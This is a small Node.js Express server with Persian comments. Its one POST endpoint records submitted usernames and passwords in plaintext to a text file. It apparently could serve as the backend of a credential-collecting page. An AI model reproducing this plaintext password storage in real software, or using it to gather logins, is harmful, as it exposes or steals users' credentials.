const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Endpoint برای ذخیره اطلاعات
app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // ذخیره اطلاعات در یک فایل
  fs.appendFile('data.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
    if (err) {
      return res.status(500).send('خطا در ذخیره اطلاعات');
    }
    res.send('اطلاعات با موفقیت ذخیره شد');
  });
});

// صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// راه اندازی سرور
app.listen(PORT, () => {
  console.log(`سرور در پورت ${PORT} در حال اجراست`);
});
